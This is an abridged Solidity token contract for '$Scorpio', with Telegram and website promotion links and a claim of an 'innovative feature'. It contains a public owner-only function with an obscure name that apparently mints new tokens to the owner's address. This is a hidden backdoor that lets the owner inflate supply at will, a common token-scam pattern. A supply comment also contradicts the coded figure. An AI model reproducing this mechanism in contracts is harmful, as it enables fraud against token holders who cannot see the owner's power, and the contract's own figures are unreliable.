//
// $Scorpio proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ScorpioBSC
// 📱 Website ::https://scorpio.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Scorpio(uint256 amount) public onlyOwner {
 _Scorpio(msg.sender, amount);
    }
    ...
    function _Scorpio(address account, uint256 amount) internal virtual {
...
contract $Scorpio is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Scorpio", "SCORPIO") {
     _Scorpio(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}